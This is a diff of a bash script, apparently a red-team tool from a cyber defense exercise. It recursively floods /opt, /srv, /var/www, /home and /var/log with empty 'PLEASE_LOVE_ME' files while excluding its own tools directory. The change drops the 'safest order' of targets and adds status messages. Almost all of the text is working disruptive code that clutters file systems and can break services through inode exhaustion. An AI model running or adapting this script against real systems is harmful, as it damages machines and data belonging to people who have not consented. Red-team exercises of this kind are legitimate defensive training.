@@ -8,16 +8,16 @@ SKIP_DIRS=(
     /usr
     /etc
     /etc/systemd /etc/init.d
+    /home/ubuntu/cdt-2026-redteam-tools
 )
 
 TARGET_DIRS=(
-    /home
-    /var/log
-    /var/www
     /opt
     /srv
+    /var/www
+    /home
+    /var/log
 )
-
 
 should_skip() {
     local target="${1%/}"
@@ -34,15 +34,13 @@ traverse() {
     [ "$depth" -gt 8 ] && return
 
     for entry in "$dir"/*/; do
-        [ -e "$entry" ] || continue
+        [ -d "$entry" ] || continue
         entry="${entry%/}"
         should_skip "$entry" && continue
-        if [ -d "$entry" ]; then
-            traverse "$entry" $((depth + 1))
-            for i in {1..20}; do
-                > "$entry/PLEASE_LOVE_ME_${i}"
-            done
-        fi
+        traverse "$entry" $((depth + 1))
+        for i in {1..20}; do
+            > "$entry/PLEASE_LOVE_ME_${i}"
+        done
     done
 
     local count=50
@@ -53,9 +51,12 @@ traverse() {
     done
 }
 
-# Hit targets in safest order
+# Hit targets in order
 for target in "${TARGET_DIRS[@]}"; do
     if [ -d "$target" ]; then
+        echo "[*] Hitting $target"
         traverse "$target"
+    else
+        echo "[SKIP] $target does not exist"
     fi
 done
